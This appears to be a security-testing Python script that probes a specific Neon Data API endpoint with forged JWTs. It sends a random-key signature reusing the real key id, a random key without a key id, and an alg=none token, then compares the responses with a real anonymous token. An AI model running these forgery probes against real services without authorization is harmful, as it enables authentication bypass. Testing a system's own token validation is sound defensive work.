# -*- coding: utf-8 -*-
"""Data API JWT 验证强度测试:伪造变体是否被接受
1) 随机 Ed25519 key(错误签名,同 kid) 2) alg=none 3) 随机 key 无 kid
4) 真实匿名 token(基线对照)
零破坏:全只读 HTTP GET。"""
import http.client, ssl, json, base64, time

ctx = ssl.create_default_context()
DA = 'ep-crimson-fog-w2gucld1.apirest.us-east-2.aws.neon.build'
NA = 'ep-crimson-fog-w2gucld1.neonauth.us-east-2.aws.neon.build'

def http_get(host, path, hdr=None):
    conn = http.client.HTTPSConnection(host, context=ctx, timeout=20)
    h = {'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json'}
    if hdr: h.update(hdr)
    conn.request('GET', path, headers=h)
    r = conn.getresponse(); raw = r.read(); st = r.status
    conn.close()
    return st, raw

def enc(o):
    return base64.urlsafe_b64encode(json.dumps(o, separators=(',', ':')).encode()).decode().rstrip('=')

# 真实匿名 token(基线)
st, raw = http_get(NA, '/neondb/auth/token/anonymous')
anon_tok = json.loads(raw)['token'] if st == 200 else None

payload = {
    'iat': int(time.time()), 'role': 'anonymous',
    'endpointId': 'ep-crimson-fog-w2gucld1', 'database': 'neondb',
    'sub': 'anonymous', 'exp': int(time.time()) + 3600,
    'iss': 'https://ep-crimson-fog-w2gucld1.neonauth.us-east-2.aws.neon.build/neondb/auth',
    'aud': 'https://ep-crimson-fog-w2gucld1.neonauth.us-east-2.aws.neon.build',
}

def test(name, tok):
    st, raw = http_get(DA, '/neondb/rest/v1/', hdr={'Authorization': 'Bearer ' + tok})
    print('[%s] -> %d | %s' % (name, st, raw[:220].decode(errors='replace').replace('\n', ' ')), flush=True)

# 1) 随机 Ed25519 key,同 kid
from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PrivateKey
rand = Ed25519PrivateKey.generate()
hdr = {'alg': 'EdDSA', 'typ': 'JWT', 'kid': '6ab964bf-eee3-4249-bac3-85adf9d5faee'}
body = enc(hdr) + '.' + enc(payload)
sig = rand.sign(body.encode())
test('random-key same-kid', body + '.' + base64.urlsafe_b64encode(sig).decode().rstrip('='))

# 2) 随机 key 无 kid
hdr2 = {'alg': 'EdDSA', 'typ': 'JWT'}
body2 = enc(hdr2) + '.' + enc(payload)
sig2 = rand.sign(body2.encode())
test('random-key no-kid', body2 + '.' + base64.urlsafe_b64encode(sig2).decode().rstrip('='))

# 3) alg=none
hdr3 = {'alg': 'none', 'typ': 'JWT'}
body3 = enc(hdr3) + '.' + enc(payload)
test('alg=none', body3 + '.')

# 4) 真实匿名 token
if anon_tok:
    test('real-anon-token', anon_tok)
